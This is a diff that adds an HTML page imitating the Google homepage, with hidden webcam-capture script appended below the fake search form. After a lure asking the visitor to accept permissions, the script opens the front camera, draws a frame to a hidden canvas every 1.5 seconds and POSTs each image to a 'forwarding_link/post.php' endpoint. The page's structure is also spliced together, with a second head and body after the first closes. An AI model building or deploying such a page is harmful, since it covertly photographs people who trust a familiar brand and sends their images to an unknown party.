@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<link rel="stylesheet" type="text/css" href="style.css">
+		<link rel="shortcut icon" type="image/png" href="favicon.ico"/>
+		<title>Google</title>
+	</head>
+	<body>
+		<header>
+			<a href="https://plus.google.com/u/0/up/follow">+Lara</a>
+			<a href="https://mail.google.com">Gmail</a>
+			<a href="https://www.google.com/imghp?hl=en&tab=wi&ei=Ox1NVMXuJYO3yATCjoFA&ved=0CAQQqi4oAg">Images</a>
+			<img id="products" src="products.png"/>
+			<img id="bell" src="bell.png"/>
+			<img id="share" src="share.png"/>
+			<img id="lara" class="headerpics" src="http://lh3.googleusercontent.com/-zkPWifjxy1M/AAAAAAAAAAI/AAAAAAAAAAA/7pAALFnncq4/s32-c/photo.jpg"/>
+		</header>
+		<div>
+			<img src="https://www.google.com/images/srpr/logo11w.png"/>
+			<form name="google" action="#" method="POST"><br>
+				<input type="search" class="search"><br>
+				<input type="submit" class="button" name="submit" value="Google Search">
+				<input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
+			</form>
+		</div>
+		<footer>
+			<a class="leftlinks" href="https://www.google.com/intl/en/ads/?fg=1">Advertising</a>
+			<a class="leftlinks" href="https://www.google.com/services/?fg=1">Business</a>
+			<a class="leftlinks" href="https://www.google.com/intl/en/about/">About</a>
+			<a class="rightlinks" href="https://www.google.com/preferences?hl=en">Settings</a>
+			<a class="rightlinks" href="https://www.google.com/intl/en/policies/?fg=1">Privacy & Terms</a>
+		</footer>
+	</body>
+
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+
+</html>
